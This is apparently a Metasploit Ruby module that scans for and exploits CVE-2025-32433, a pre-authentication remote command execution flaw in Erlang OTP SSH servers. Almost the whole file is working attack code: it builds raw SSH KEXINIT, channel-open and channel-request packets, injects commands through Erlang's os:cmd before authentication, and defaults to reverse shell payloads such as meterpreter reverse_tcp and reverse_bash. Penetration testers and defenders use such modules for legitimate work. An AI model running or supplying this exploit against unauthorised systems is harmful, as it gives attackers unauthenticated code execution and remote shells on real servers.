##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Erlang OTP Pre-Auth RCE Scanner and Exploit',
        'Description' => %q{
          This module detect and exploits CVE-2025-32433, a pre-authentication vulnerability in Erlang-based SSH
          servers that allows remote command execution. By sending crafted SSH packets, it executes a payload to
          establish a reverse shell on the target system.

          The exploit leverages a flaw in the SSH protocol handling to execute commands via the Erlang `os:cmd`
          function without requiring authentication.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Horizon3 Attack Team',
          'Matt Keeley', # PoC
          'Martin Kristiansen', # PoC
          'mekhalleh (RAMELLA Sebastien)' # module author powered by EXA Reunion (https://www.exa.re/)
        ],
        'References' => [
          ['CVE', '2025-32433'],
          ['URL', 'https://x.com/Horizon3Attack/status/1912945580902334793'],
          ['URL', 'https://platformsecurity.com/blog/CVE-2025-32433-poc'],
          ['URL', 'https://github.com/ProDefense/CVE-2025-32433']
        ],
        'Platform' => ['linux', 'unix'],
        'Arch' => [ARCH_CMD],
        'Targets' => [
          [
            'Linux Command', {
              'Platform' => 'linux',
              'Arch' => ARCH_CMD,
              'Type' => :linux_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/linux/https/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix Command', {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ]
        ],
        'Privileged' => false,
        'DisclosureDate' => '2025-04-16',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptBool.new('CHECK_ONLY', [false, 'Only check for vulnerability without exploiting', false])
    ])
  end

  # builds SSH_MSG_CHANNEL_OPEN for session
  def build_channel_open(channel_id)
    "\x5a" +
      string_payload('session') +
      [channel_id].pack('N') +
      [0x68000].pack('N') +
      [0x10000].pack('N')
  end

  # builds SSH_MSG_CHANNEL_REQUEST with 'exec' payload
  def build_channel_request(channel_id, command)
    "\x62" +
      [channel_id].pack('N') +
      string_payload('exec') +
      "\x01" +
      string_payload("os:cmd(\"#{command}\").")
  end

  # builds a minimal but valid SSH_MSG_KEXINIT packet
  def build_kexinit
    cookie = "\x00" * 16
    "\x14" +
      cookie +
      name_list(
        [
          'curve25519-sha256',
          'ecdh-sha2-nistp256',
          'diffie-hellman-group-exchange-sha256',
          'diffie-hellman-group14-sha256'
        ]
      ) +
      name_list(['rsa-sha2-256', 'rsa-sha2-512']) +
      name_list(['aes128-ctr']) * 2 +
      name_list(['hmac-sha1']) * 2 +
      name_list(['none']) * 2 +
      name_list([]) * 2 +
      "\x00" +
      [0].pack('N')
  end

  def message(msg)
    "ssh://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  # formats a list of names into an SSH-compatible string (comma-separated)
  def name_list(names)
    string_payload(names.join(','))
  end

  # pads a packet to match SSH framing
  def pad_packet(payload, block_size)
    min_padding = 4
    payload_length = payload.length
    padding_len = block_size - ((payload_length + 5) % block_size)
    padding_len += block_size if padding_len < min_padding
    [(payload_length + 1 + padding_len)].pack('N') +
      [padding_len].pack('C') +
      payload +
      "\x00" * padding_len
  end

  # helper to format SSH string (4-byte length + bytes)
  def string_payload(str)
    s_bytes = str.encode('utf-8')
    [s_bytes.length].pack('N') + s_bytes
  end

  def check_host(target_host)
    print_status(message('Starting scanner for CVE-2025-32433'))

    connect
    sock.put("SSH-2.0-OpenSSH_8.9\r\n")
    banner = sock.get_once(1024, 10)
    unless banner
      print_status(message('No banner received'))
      return Exploit::CheckCode::Unknown
    end

    unless banner.to_s.downcase.include?('erlang')
      print_status(message("Not an Erlang SSH service: #{banner.strip}"))
      return Exploit::CheckCode::Safe
    end
    sleep(0.5)

    print_status(message('Sending SSH_MSG_KEXINIT...'))
    kex_packet = build_kexinit
    sock.put(pad_packet(kex_packet, 8))
    sleep(0.5)

    response = sock.get_once(1024, 5)
    unless response
      print_status(message("Detected Erlang SSH service: #{banner.strip}, but no response to KEXINIT"))
      return Exploit::CheckCode::Detected
    end

    print_status(message('Sending SSH_MSG_CHANNEL_OPEN...'))
    chan_open = build_channel_open(0)
    sock.put(pad_packet(chan_open, 8))
    sleep(0.5)

    print_status(message('Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...'))
    chan_req = build_channel_request(0, Rex::Text.rand_text_alpha(rand(4..8)).to_s)
    sock.put(pad_packet(chan_req, 8))
    sleep(0.5)

    begin
      sock.get_once(1024, 5)
    rescue EOFError, Errno::ECONNRESET
      print_error(message('The target is not vulnerable to CVE-2025-32433.'))
      return Exploit::CheckCode::Safe
    end
    sock.close

    note = 'The target is vulnerable to CVE-2025-32433.'
    print_good(message(note))
    report_vuln(
      host: target_host,
      name: name,
      refs: references,
      info: note
    )
    Exploit::CheckCode::Vulnerable
  rescue Rex::ConnectionError
    print_error(message('Failed to connect to the target'))
    Exploit::CheckCode::Unknown
  rescue Rex::TimeoutError
    print_error(message('Connection timed out'))
    Exploit::CheckCode::Unknown
  ensure
    disconnect unless sock.nil?
  end

  def exploit
    if datastore['CHECK_ONLY']
      check_host(datastore['RHOST'])
      return
    end

    print_status(message('Starting exploit for CVE-2025-32433'))
    connect
    sock.put("SSH-2.0-OpenSSH_8.9\r\n")
    banner = sock.get_once(1024)
    if banner
      print_good(message("Received banner: #{banner.strip}"))
    else
      fail_with(Failure::Unknown, 'No banner received')
    end
    sleep(0.5)

    print_status(message('Sending SSH_MSG_KEXINIT...'))
    kex_packet = build_kexinit
    sock.put(pad_packet(kex_packet, 8))
    sleep(0.5)

    print_status(message('Sending SSH_MSG_CHANNEL_OPEN...'))
    chan_open = build_channel_open(0)
    sock.put(pad_packet(chan_open, 8))
    sleep(0.5)

    print_status(message('Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...'))
    chan_req = build_channel_request(0, payload.encoded)
    sock.put(pad_packet(chan_req, 8))

    begin
      response = sock.get_once(1024, 5)
      if response
        vprint_status(message("Received response: #{response.unpack('H*').first}"))
        print_good(message('Payload sent successfully'))
      else
        print_status(message('No response within timeout period (which is expected)'))
      end
    rescue Rex::TimeoutError
      print_status(message('No response within timeout period (which is expected)'))
    end
    sock.close
  rescue Rex::ConnectionError
    fail_with(Failure::Unreachable, 'Failed to connect to the target')
  rescue Rex::TimeoutError
    fail_with(Failure::TimeoutExpired, 'Connection timed out')
  rescue StandardError => e
    fail_with(Failure::Unknown, "Error: #{e.message}")
  end

end